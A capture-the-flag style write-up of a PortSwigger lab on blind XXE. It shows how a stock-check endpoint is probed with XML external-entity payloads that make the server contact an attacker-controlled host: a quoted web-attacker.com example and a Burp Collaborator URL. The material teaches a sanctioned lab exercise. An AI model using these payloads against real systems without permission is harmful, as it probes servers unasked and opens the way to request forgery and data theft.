# Blind XXE with out-of-band interaction

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction), you'll learn: Blind XXE with out-of-band interaction! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301131837.png)

In here, we can view other products' details:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301131907.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301131918.png)

Also, in all products details, we can check the available stocks.

**Let's click on the "Check stock" button, and see the responses in Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301132028.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301132043.png)

**When we clicked that button, it'll send a POST request to `/product/stock`, with an XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

When we see XML data, it's worth to test XXE (XML external entity) injection, XPATH injection.

**In XXE injection, we can try to trigger an XML parsing error to identify is there any XXE vulnerability:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        a
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301132439.png)

When we parsed an invalid `productId`, it'll response us "Invalid product ID".

That being said, we don't see any XML parsing error.

Now, we can also test **blind XXE**!

### What is blind XXE?

Blind XXE vulnerabilities arise where the application is vulnerable to [XXE injection](https://portswigger.net/web-security/xxe) but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

### Detecting blind XXE using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

**Armed with above information, let's try to send the following payload to dectect blind XXE.**

- Go to Burp Suite's Collaborator and copy the payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301132845.png)

- Send the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://e8nrmvt5jkg4fqm3m6akoir08rej29qy.oastify.com"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301133041.png)

- Burp Suite's Collaborator:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-3/images/Pasted%20image%2020230301133059.png)

As you can see, we've **recieved 2 DNS lookups**, which means **the "Check stock" feature is indeed vulnerable to blind XXE injection**!!

# What we've learned:

1. Blind XXE with out-of-band interaction